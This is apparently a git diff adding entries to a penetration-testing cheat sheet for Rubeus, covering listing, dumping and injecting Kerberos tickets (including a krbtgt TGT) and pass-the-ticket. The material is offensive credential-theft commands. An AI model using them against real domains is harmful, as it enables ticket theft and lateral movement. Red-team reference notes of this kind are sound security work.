@@ -76,3 +76,41 @@ Rubeus.exe hash /password:$PASSWORD /user:$USERNAME /domain:$DOMAIN
 ```powershell
 Rubeus.exe kerberoast
 ```
+
+---
+
+## List All Accessible Kerberos Tickets
+
+```powershell
+Rubeus.exe triage
+```
+
+---
+
+## Dump an Accessible Kerberos Ticket
+
+```powershell
+Rubeus.exe dump /service:$SERVICE_ONLY_OF_TICKETS_SPN /luid:$LUID /nowrap
+```
+
+- Example `$SERVICE_ONLY_OF_TICKETS_SPN` would be `krbtgt` for a TGT
+
+---
+
+## Spawn New Process within New Logon Session
+
+```powershell
+Rubeus.exe createnetonly /program:$PATH_TO_PROGRAM
+```
+
+The tickets you see will depend on your current context. Local administrators can see all tickets. Regular users can only see their own.
+
+---
+
+## Inject Kerberos Ticket into Logon Session
+
+```powershell
+Rubeus.exe ptt /luid:$LUID /ticket:$TICKET_BASE64_STRING
+```
+
+- `$LUID` is the logon session's ID
